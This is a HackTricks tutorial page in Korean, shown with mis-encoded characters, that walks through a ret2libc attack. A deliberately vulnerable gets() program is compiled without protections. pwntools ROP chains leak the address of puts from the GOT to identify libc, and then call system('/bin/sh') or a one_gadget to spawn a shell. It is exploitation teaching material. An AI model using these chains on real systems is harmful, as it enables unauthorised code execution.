# ROPì„ ì‚¬ìš©í•˜ì—¬ libc ì£¼ì†Œ ëˆ„ì¶œ

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ì—ì„œ <strong>AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ìš°ì„¸ìš”</strong>!<strong></strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ í™ë³´í•˜ê±°ë‚˜ PDFë¡œ HackTricksë¥¼ ë‹¤ìš´ë¡œë“œ**í•˜ê³  ì‹¶ë‹¤ë©´ [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **í•´í‚¹ ìš”ë ¹ì„ ê³µìœ í•˜ë ¤ë©´ PRì„ ì œì¶œí•˜ì—¬** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œë¥¼ í™•ì¸í•˜ì„¸ìš”.

</details>

## ë¹ ë¥¸ ìš”ì•½

1. **ì˜¤ë²„í”Œë¡œìš° ì˜¤í”„ì…‹** ì°¾ê¸°
2. `POP_RDI` ê°€ì ¯, `PUTS_PLT` ë° `MAIN` ê°€ì ¯ ì°¾ê¸°
3. ì´ì „ ê°€ì ¯ì„ ì‚¬ìš©í•˜ì—¬ puts ë˜ëŠ” ë‹¤ë¥¸ libc í•¨ìˆ˜ì˜ ë©”ëª¨ë¦¬ ì£¼ì†Œë¥¼ **ëˆ„ì¶œ**í•˜ê³  **libc ë²„ì „ì„ ì°¾ê¸°** ([ë‹¤ìš´ë¡œë“œ](https://libc.blukat.me))
4. ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì‚¬ìš©í•˜ì—¬ ROPë¥¼ ê³„ì‚°í•˜ê³  ì´ë¥¼ ì•…ìš©í•˜ê¸°

## ì—°ìŠµí•  ë‹¤ë¥¸ ììŠµì„œ ë° ì´ì§„ íŒŒì¼

ì´ ììŠµì„œëŠ” ì´ ììŠµì„œì—ì„œ ì œì•ˆëœ ì½”ë“œ/ë°”ì´ë„ˆë¦¬ë¥¼ ì•…ìš©í•  ê²ƒì…ë‹ˆë‹¤: [https://tasteofsecurity.com/security/ret2libc-unknown-libc/](https://tasteofsecurity.com/security/ret2libc-unknown-libc/)\
ë‹¤ë¥¸ ìœ ìš©í•œ ììŠµì„œ: [https://made0x78.com/bseries-ret2libc/](https://made0x78.com/bseries-ret2libc/), [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)

## ì½”ë“œ

íŒŒì¼ëª…: `vuln.c`
```c
#include <stdio.h>

int main() {
char buffer[32];
puts("Simple ROP.\n");
gets(buffer);

return 0;
}
```

```bash
gcc -o vuln vuln.c -fno-stack-protector -no-pie
```
## ROP - LIBC ì£¼ì†Œ ë…¸ì¶œ í…œí”Œë¦¿

í•´í‚¹ ë„êµ¬ë¥¼ ë‹¤ìš´ë¡œë“œí•˜ê³  ì·¨ì•½í•œ ì´ì§„ íŒŒì¼ê³¼ ë™ì¼í•œ ë””ë ‰í† ë¦¬ì— ë„£ì€ í›„ ìŠ¤í¬ë¦½íŠ¸ì— í•„ìš”í•œ ë°ì´í„°ë¥¼ ì œê³µí•˜ì‹­ì‹œì˜¤:

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

## 1- ì˜¤í”„ì…‹ ì°¾ê¸°

í…œí”Œë¦¿ì€ ê³µê²©ì„ ê³„ì†í•˜ê¸° ì „ì— ì˜¤í”„ì…‹ì´ í•„ìš”í•©ë‹ˆë‹¤. ì œê³µëœ ê²½ìš° í•„ìš”í•œ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ì—¬ ì˜¤í”„ì…‹ì„ ì°¾ìŠµë‹ˆë‹¤ (ê¸°ë³¸ê°’ì€ `OFFSET = ""`):
```bash
###################
### Find offset ###
###################
OFFSET = ""#"A"*72
if OFFSET == "":
gdb.attach(p.pid, "c") #Attach and continue
payload = cyclic(1000)
print(r.clean())
r.sendline(payload)
#x/wx $rsp -- Search for bytes that crashed the application
#cyclic_find(0x6161616b) # Find the offset of those bytes
return
```
**ì‹¤í–‰** `python template.py`ë¥¼ í•˜ë©´ í”„ë¡œê·¸ë¨ì´ ì¶©ëŒí•œ ìƒíƒœë¡œ GDB ì½˜ì†”ì´ ì—´ë¦½ë‹ˆë‹¤. í•´ë‹¹ **GDB ì½˜ì†”**ì—ì„œ `x/wx $rsp`ë¥¼ ì‹¤í–‰í•˜ì—¬ RIPë¥¼ ë®ì–´ì“¸ **ë°”ì´íŠ¸**ë¥¼ ì–»ìŠµë‹ˆë‹¤. ë§ˆì§€ë§‰ìœ¼ë¡œ **íŒŒì´ì¬** ì½˜ì†”ì„ ì‚¬ìš©í•˜ì—¬ **ì˜¤í”„ì…‹**ì„ êµ¬í•©ë‹ˆë‹¤:
```python
from pwn import *
cyclic_find(0x6161616b)
```
![](<../../../../.gitbook/assets/image (1007).png>)

ì˜¤í”„ì…‹ì„ ì°¾ì€ í›„ (ì´ ê²½ìš° 40) í•´ë‹¹ ê°’ì„ ì‚¬ìš©í•˜ì—¬ í…œí”Œë¦¿ ë‚´ì˜ OFFSET ë³€ìˆ˜ë¥¼ ë³€ê²½í•©ë‹ˆë‹¤.\
`OFFSET = "A" * 40`

ë‹¤ë¥¸ ë°©ë²•ì€ `pattern create 1000`ì„ ì‚¬ìš©í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤. -- _retê¹Œì§€ ì‹¤í–‰_ -- GEFì—ì„œ `pattern search $rsp`ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤.

## 2- ê°€ì ¯ ì°¾ê¸°

ì´ì œ ì´ì§„ íŒŒì¼ ë‚´ì—ì„œ ROP ê°€ì ¯ì„ ì°¾ì•„ì•¼ í•©ë‹ˆë‹¤. ì´ ROP ê°€ì ¯ì€ **ì‚¬ìš© ì¤‘ì¸ libc**ë¥¼ ì°¾ê¸° ìœ„í•´ `puts`ë¥¼ í˜¸ì¶œí•˜ëŠ” ë° ìœ ìš©í•˜ë©°, ë‚˜ì¤‘ì— **ìµœì¢… ê³µê²©ì„ ì‹¤í–‰**í•˜ëŠ” ë° ì‚¬ìš©ë  ê²ƒì…ë‹ˆë‹¤.
```python
PUTS_PLT = elf.plt['puts'] #PUTS_PLT = elf.symbols["puts"] # This is also valid to call puts
MAIN_PLT = elf.symbols['main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep "pop rdi"
RET = (rop.find_gadget(['ret']))[0]

log.info("Main start: " + hex(MAIN_PLT))
log.info("Puts plt: " + hex(PUTS_PLT))
log.info("pop rdi; ret  gadget: " + hex(POP_RDI))
```
`PUTS_PLT`ëŠ” **puts í•¨ìˆ˜**ë¥¼ í˜¸ì¶œí•˜ê¸° ìœ„í•´ í•„ìš”í•©ë‹ˆë‹¤.\
`MAIN_PLT`ëŠ” **exploit**ì„ **ë‹¤ì‹œ** ì‚¬ìš©í•˜ì—¬ **overflow**ë¥¼ **ë‹¤ì‹œ** í˜¸ì¶œí•˜ê¸° ìœ„í•´ **main í•¨ìˆ˜**ë¥¼ í˜¸ì¶œí•´ì•¼ í•©ë‹ˆë‹¤ (exploitationì˜ ë¬´í•œ ë¼ìš´ë“œ). **ê° ROPì˜ ëì—ì„œ í”„ë¡œê·¸ë¨ì„ ë‹¤ì‹œ í˜¸ì¶œí•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤**.\
**POP\_RDI**ëŠ” **í˜¸ì¶œëœ í•¨ìˆ˜ì— ë§¤ê°œë³€ìˆ˜ë¥¼ ì „ë‹¬**í•˜ê¸° ìœ„í•´ í•„ìš”í•©ë‹ˆë‹¤.

ì´ ë‹¨ê³„ì—ì„œëŠ” ì‹¤í–‰í•  í•„ìš”ê°€ ì—†ìŠµë‹ˆë‹¤. ëª¨ë“  ê²ƒì€ ì‹¤í–‰ ì¤‘ì— pwntoolsì— ì˜í•´ ì°¾ì•„ì§ˆ ê²ƒì…ë‹ˆë‹¤.

## 3- libc ë¼ì´ë¸ŒëŸ¬ë¦¬ ì°¾ê¸°

ì´ì œ ì‚¬ìš© ì¤‘ì¸ **libc** ë¼ì´ë¸ŒëŸ¬ë¦¬ ë²„ì „ì„ ì°¾ì„ ì‹œê°„ì…ë‹ˆë‹¤. ì´ë¥¼ ìœ„í•´ **ë©”ëª¨ë¦¬**ì—ì„œ **puts í•¨ìˆ˜**ì˜ **ì£¼ì†Œ**ë¥¼ **leak**í•˜ê³ , ê·¸ ì£¼ì†Œì— ìˆëŠ” **puts ë²„ì „ì´ ìˆëŠ” ë¼ì´ë¸ŒëŸ¬ë¦¬ ë²„ì „**ì„ **ê²€ìƒ‰**í•  ê²ƒì…ë‹ˆë‹¤.
```python
def get_addr(func_name):
FUNC_GOT = elf.got[func_name]
log.info(func_name + " GOT @ " + hex(FUNC_GOT))
# Create rop chain
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)

#Send our rop-chain payload
#p.sendlineafter("dah?", rop1) #Interesting to send in a specific moment
print(p.clean()) # clean socket buffer (read all and print)
p.sendline(rop1)

#Parse leaked address
recieved = p.recvline().strip()
leak = u64(recieved.ljust(8, "\x00"))
log.info("Leaked libc address,  "+func_name+": "+ hex(leak))
#If not libc yet, stop here
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))

return hex(leak)

get_addr("puts") #Search for puts address in memmory to obtains libc base
if libc == "":
print("Find the libc library and continue with the exploit... (https://libc.blukat.me/)")
p.interactive()
```
ì´ë¥¼ ìœ„í•´ ì‹¤í–‰ëœ ì½”ë“œì˜ ê°€ì¥ ì¤‘ìš”í•œ ì¤„ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:
```python
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
```
ì´ëŠ” **RIP**ë¥¼ ë®ì–´ì“¸ ìˆ˜ ìˆëŠ” ë°”ì´íŠ¸ë¥¼ ë³´ë‚´ê²Œ ë©ë‹ˆë‹¤: `OFFSET`.\
ê·¸ëŸ° ë‹¤ìŒ, `POP_RDI` ê°€ì ¯ì˜ **ì£¼ì†Œ**ë¥¼ ì„¤ì •í•˜ì—¬ ë‹¤ìŒ ì£¼ì†Œ(`FUNC_GOT`)ê°€ **RDI** ë ˆì§€ìŠ¤í„°ì— ì €ì¥ë©ë‹ˆë‹¤. ì´ëŠ” `PUTS_GOT`ì˜ **ì£¼ì†Œ**ë¥¼ **ì „ë‹¬**í•˜ê¸° ìœ„í•´ **putsë¥¼ í˜¸ì¶œ**í•˜ë ¤ê³  í•˜ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤. ë©”ëª¨ë¦¬ ì£¼ì†Œì— ìˆëŠ” puts í•¨ìˆ˜ì˜ ì£¼ì†Œê°€ `PUTS_GOT`ê°€ ê°€ë¦¬í‚¤ëŠ” ì£¼ì†Œì— ì €ì¥ë˜ì–´ ìˆê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.\
ì´í›„, `PUTS_PLT`ê°€ í˜¸ì¶œë  ê²ƒì…ë‹ˆë‹¤ (`PUTS_GOT`ì´ **RDI** ì•ˆì— ìˆìŒ) ë”°ë¼ì„œ putsëŠ” `PUTS_GOT` ì•ˆì— ìˆëŠ” ë‚´ìš©(**ë©”ëª¨ë¦¬ì— ìˆëŠ” puts í•¨ìˆ˜ì˜ ì£¼ì†Œ**)ì„ **ì½ê³  ì¶œë ¥**í•  ê²ƒì…ë‹ˆë‹¤.\
ë§ˆì§€ë§‰ìœ¼ë¡œ, **main í•¨ìˆ˜ê°€ ë‹¤ì‹œ í˜¸ì¶œ**ë˜ë¯€ë¡œ ìš°ë¦¬ëŠ” ë‹¤ì‹œ ì˜¤ë²„í”Œë¡œìš°ë¥¼ ì´ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ë ‡ê²Œ í•¨ìœ¼ë¡œì¨ ìš°ë¦¬ëŠ” **puts í•¨ìˆ˜ë¥¼ ì†ì´ê³ ** **ë©”ëª¨ë¦¬**ì— ìˆëŠ” **puts í•¨ìˆ˜ì˜ ì£¼ì†Œ**ë¥¼ ì¶œë ¥í•˜ê²Œ í–ˆìŠµë‹ˆë‹¤(ì´ëŠ” **libc** ë¼ì´ë¸ŒëŸ¬ë¦¬ ë‚´ë¶€ì— ìˆìŠµë‹ˆë‹¤). ì´ì œ í•´ë‹¹ ì£¼ì†Œë¥¼ í†µí•´ **ì–´ë–¤ libc ë²„ì „ì´ ì‚¬ìš© ì¤‘ì¸ì§€ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤**.

![](<../../../../.gitbook/assets/image (1049).png>)

ìš°ë¦¬ëŠ” **ë¡œì»¬** ë°”ì´ë„ˆë¦¬ë¥¼ **exploiting** í•˜ê³  ìˆê¸° ë•Œë¬¸ì— **libc**ì˜ ì–´ë–¤ ë²„ì „ì´ ì‚¬ìš© ì¤‘ì¸ì§€ ì•Œ í•„ìš”ê°€ ì—†ìŠµë‹ˆë‹¤(`/lib/x86_64-linux-gnu/libc.so.6`ì—ì„œ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì°¾ê¸°ë§Œ í•˜ë©´ ë©ë‹ˆë‹¤).\
ê·¸ëŸ¬ë‚˜ ì›ê²© exploit ê²½ìš°ì—ëŠ” ì–´ë–»ê²Œ ì°¾ì„ ìˆ˜ ìˆëŠ”ì§€ ì—¬ê¸°ì„œ ì„¤ëª…í•˜ê² ìŠµë‹ˆë‹¤:

### 3.1- libc ë²„ì „ ê²€ìƒ‰ (1)

ë‹¤ìŒ ì›¹í˜ì´ì§€ì—ì„œ ì‚¬ìš© ì¤‘ì¸ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ê²€ìƒ‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤: [https://libc.blukat.me/](https://libc.blukat.me)\
ì´ëŠ” ë°œê²¬ëœ **libc** ë²„ì „ì„ ë‹¤ìš´ë¡œë“œí•  ìˆ˜ ìˆê²Œ í•´ì¤ë‹ˆë‹¤

![](<../../../../.gitbook/assets/image (221).png>)

### 3.2- libc ë²„ì „ ê²€ìƒ‰ (2)

ë˜í•œ ë‹¤ìŒì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

* `$ git clone https://github.com/niklasb/libc-database.git`
* `$ cd libc-database`
* `$ ./get`

ì´ ì‘ì—…ì—ëŠ” ì‹œê°„ì´ ê±¸ë¦´ ìˆ˜ ìˆìœ¼ë‹ˆ ê¸°ë‹¤ë ¤ ì£¼ì„¸ìš”.\
ì´ ì‘ì—…ì„ ìœ„í•´ í•„ìš”í•œ ê²ƒì€:

* Libc ì‹¬ë³¼ ì´ë¦„: `puts`
* ëˆ„ì¶œëœ libc ì£¼ì†Œ: `0x7ff629878690`

ê°€ì¥ ê°€ëŠ¥ì„±ì´ ë†’ì€ **libc**ë¥¼ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
./find puts 0x7ff629878690
ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)
archive-glibc (id libc6_2.23-0ubuntu11_amd64)
```
ìš°ë¦¬ëŠ” 2ê°œì˜ ë§¤ì¹˜ë¥¼ ì–»ì—ˆìŠµë‹ˆë‹¤ (ì²« ë²ˆì§¸ê°€ ì‘ë™í•˜ì§€ ì•Šìœ¼ë©´ ë‘ ë²ˆì§¸ë¥¼ ì‹œë„í•´ë³´ì„¸ìš”). ì²« ë²ˆì§¸ ê²ƒì„ ë‹¤ìš´ë¡œë“œí•˜ì„¸ìš”:
```bash
./download libc6_2.23-0ubuntu10_amd64
Getting libc6_2.23-0ubuntu10_amd64
-> Location: http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.23-0ubuntu10_amd64.deb
-> Downloading package
-> Extracting package
-> Package saved to libs/libc6_2.23-0ubuntu10_amd64
```
### 3.3- ë¦­ì„ ìœ„í•œ ë‹¤ë¥¸ í•¨ìˆ˜ë“¤

`libs/libc6_2.23-0ubuntu10_amd64/libc-2.23.so`ì—ì„œ libcë¥¼ ìš°ë¦¬ ì‘ì—… ë””ë ‰í† ë¦¬ë¡œ ë³µì‚¬í•©ë‹ˆë‹¤.
```python
puts
printf
__libc_start_main
read
gets
```
## 4- libc ì£¼ì†Œ ì°¾ê¸° ë° ì´ìš©

ì´ ì‹œì ì—ì„œ ìš°ë¦¬ëŠ” ì‚¬ìš©ëœ libc ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì•Œì•„ì•¼ í•©ë‹ˆë‹¤. ë¡œì»¬ ì´ì§„ íŒŒì¼ì„ ì´ìš©í•˜ê³  ìˆê¸° ë•Œë¬¸ì—, `/lib/x86_64-linux-gnu/libc.so.6`ë¥¼ ì‚¬ìš©í•  ê²ƒì…ë‹ˆë‹¤.

ê·¸ë˜ì„œ, `template.py`ì˜ ì‹œì‘ ë¶€ë¶„ì—ì„œ **libc** ë³€ìˆ˜ë¥¼ ë‹¤ìŒê³¼ ê°™ì´ ë³€ê²½í•˜ì‹­ì‹œì˜¤: `libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") #Set library path when know it`

**libc ë¼ì´ë¸ŒëŸ¬ë¦¬ì˜ ê²½ë¡œ**ë¥¼ ì œê³µí•˜ë©´ **ë‚˜ë¨¸ì§€ exploitì€ ìë™ìœ¼ë¡œ ê³„ì‚°**ë  ê²ƒì…ë‹ˆë‹¤.

`get_addr` í•¨ìˆ˜ ë‚´ì—ì„œ **libcì˜ ë² ì´ìŠ¤ ì£¼ì†Œ**ê°€ ê³„ì‚°ë  ê²ƒì…ë‹ˆë‹¤:
```python
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))
```
{% hint style="info" %}
**ìµœì¢… libc ê¸°ë³¸ ì£¼ì†ŒëŠ” ë°˜ë“œì‹œ 00ìœ¼ë¡œ ëë‚˜ì•¼** í•©ë‹ˆë‹¤. ê·¸ë ‡ì§€ ì•Šì€ ê²½ìš° ì˜ëª»ëœ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ë…¸ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

ê·¸ëŸ° ë‹¤ìŒ `system` í•¨ìˆ˜ì˜ ì£¼ì†Œì™€ _"/bin/sh"_ ë¬¸ìì—´ì˜ **ì£¼ì†Œ**ëŠ” **libc**ì˜ **ê¸°ë³¸ ì£¼ì†Œ**ì—ì„œ **ê³„ì‚°**ë˜ë©° ì£¼ì–´ì§„ **libc ë¼ì´ë¸ŒëŸ¬ë¦¬**ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤.
```python
BINSH = next(libc.search("/bin/sh")) - 64 #Verify with find /bin/sh
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]

log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))
```
ë§ˆì¹¨ë‚´, /bin/sh ì‹¤í–‰ exploitì´ ì¤€ë¹„ë˜ì–´ ì „ì†¡ë  ê²ƒì…ë‹ˆë‹¤:
```python
rop2 = OFFSET + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) + p64(EXIT)

p.clean()
p.sendline(rop2)

#### Interact with the shell #####
p.interactive() #Interact with the conenction
```
## ìµœì¢… ROP ì„¤ëª…

ë§ˆì§€ë§‰ ROP(`rop1`)ì€ ë‹¤ì‹œ main í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ì—¬ **ë‹¤ì‹œ exploit**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤(ê·¸ë˜ì„œ `OFFSET`ì´ ë‹¤ì‹œ ë‚˜íƒ€ë‚©ë‹ˆë‹¤). ê·¸ëŸ° ë‹¤ìŒ, _"/bin/sh"_ì˜ **ì£¼ì†Œ**(`BINSH`)ë¥¼ ê°€ë¦¬í‚¤ëŠ” `POP_RDI`ë¥¼ í˜¸ì¶œí•˜ê³  **system** í•¨ìˆ˜(`SYSTEM`)ë¥¼ í˜¸ì¶œí•˜ì—¬ _"/bin/sh"_ì˜ ì£¼ì†Œê°€ ë§¤ê°œë³€ìˆ˜ë¡œ ì „ë‹¬ë˜ë„ë¡ í•©ë‹ˆë‹¤.\
ë§ˆì§€ë§‰ìœ¼ë¡œ **exit í•¨ìˆ˜ì˜ ì£¼ì†Œ**ê°€ **í˜¸ì¶œ**ë˜ì–´ í”„ë¡œì„¸ìŠ¤ê°€ **ì˜ ì¢…ë£Œ**ë˜ê³  ì–´ë–¤ ê²½ê³ ë„ ë°œìƒí•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.

**ì´ë ‡ê²Œ í•˜ë©´ exploitì´ \_/bin/sh**\_\*\* ì‰˜ì„ ì‹¤í–‰**í•©ë‹ˆë‹¤.\*\*

![](<../../../../.gitbook/assets/image (165).png>)

## 4(2)- ONE\_GADGET ì‚¬ìš©

**ONE\_GADGET**ì„ ì‚¬ìš©í•˜ì—¬ **system** ë° **"/bin/sh"** ëŒ€ì‹  ì‰˜ì„ ì–»ì„ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤. **ONE\_GADGET**ì€ libc ë¼ì´ë¸ŒëŸ¬ë¦¬ ë‚´ì—ì„œ í•˜ë‚˜ì˜ **ROP ì£¼ì†Œ**ë§Œ ì‚¬ìš©í•˜ì—¬ ì‰˜ì„ ì–»ëŠ” ë°©ë²•ì„ ì°¾ì•„ì¤ë‹ˆë‹¤.\
ê·¸ëŸ¬ë‚˜ ì¼ë°˜ì ìœ¼ë¡œ `[rsp+0x30] == NULL`ì™€ ê°™ì€ ì œì•½ ì¡°ê±´ì´ ìˆìŠµë‹ˆë‹¤. **RSP** ë‚´ì˜ ê°’ì„ ì œì–´í•  ìˆ˜ ìˆê¸° ë•Œë¬¸ì— ë” ë§ì€ NULL ê°’ì„ ë³´ë‚´ ì œì•½ ì¡°ê±´ì„ í”¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

![](<../../../../.gitbook/assets/image (754).png>)
```python
ONE_GADGET = libc.address + 0x4526a
rop2 = base + p64(ONE_GADGET) + "\x00"*100
```
## EXPLOIT FILE

ì´ ì·¨ì•½ì ì„ ì•…ìš©í•˜ëŠ” í…œí”Œë¦¿ì„ ë‹¤ìŒì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

## ì¼ë°˜ì ì¸ ë¬¸ì œ

### MAIN\_PLT = elf.symbols\['main']ë¥¼ ì°¾ì„ ìˆ˜ ì—†ìŒ

"main" ì‹¬ë³¼ì´ ì¡´ì¬í•˜ì§€ ì•ŠëŠ” ê²½ìš°. ê·¸ëŸ¼ main ì½”ë“œê°€ ì–´ë””ì— ìˆëŠ”ì§€ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```python
objdump -d vuln_binary | grep "\.text"
Disassembly of section .text:
0000000000401080 <.text>:
```
ê·¸ë¦¬ê³  ì£¼ì†Œë¥¼ ìˆ˜ë™ìœ¼ë¡œ ì„¤ì •í•˜ì‹­ì‹œì˜¤:
```python
MAIN_PLT = 0x401080
```
### Putsë¥¼ ì°¾ì„ ìˆ˜ ì—†ìŒ

ë§Œì•½ ì´ì§„ íŒŒì¼ì´ Putsë¥¼ ì‚¬ìš©í•˜ì§€ ì•ŠëŠ”ë‹¤ë©´ ë‹¤ìŒì„ í™•ì¸í•´ì•¼ í•©ë‹ˆë‹¤.

### `sh: 1: %s%s%s%s%s%s%s%s: not found`

ëª¨ë“  exploitì„ ìƒì„±í•œ í›„ì— ì´ **ì—ëŸ¬**ë¥¼ ë°œê²¬í•œë‹¤ë©´: `sh: 1: %s%s%s%s%s%s%s%s: not found`

**"/bin/sh" ì£¼ì†Œì—ì„œ 64ë°”ì´íŠ¸ë¥¼ ë¹¼ë³´ì„¸ìš”**:
```python
BINSH = next(libc.search("/bin/sh")) - 64
```
<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ì™€ í•¨ê»˜ ì œë¡œë¶€í„° ì˜ì›…ì´ ë˜ëŠ” AWS í•´í‚¹ ë°°ìš°ê¸°</summary>

ë‹¤ë¥¸ ë°©ë²•ìœ¼ë¡œ HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ê³  ì‹¶ë‹¤ë©´ [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* ì—¬ëŸ¬ë¶„ì˜ í•´í‚¹ ê¸°êµë¥¼ ê³µìœ í•˜ë ¤ë©´ [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì„¸ìš”.

</details>
